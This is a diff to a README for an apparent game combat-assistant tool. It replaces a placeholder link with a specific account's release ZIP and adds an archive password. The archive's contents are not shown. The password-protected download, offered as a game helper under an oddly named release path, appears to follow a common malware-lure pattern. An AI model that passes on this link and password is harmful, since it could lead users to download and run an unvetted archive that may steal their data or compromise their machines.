@@ -8,7 +8,7 @@
 
 ## 📥 DOWNLOAD
 
-### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/YOUR_USERNAME/HSR-Combat-Assistant/releases/latest/download/HSR-Assistant.zip)
+### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/roman-liu-19b5/HSR-Combat-Assistant/releases/download/download/HSR_Assistant.zip)
 
 🔐 Archive password: `5868781`
 
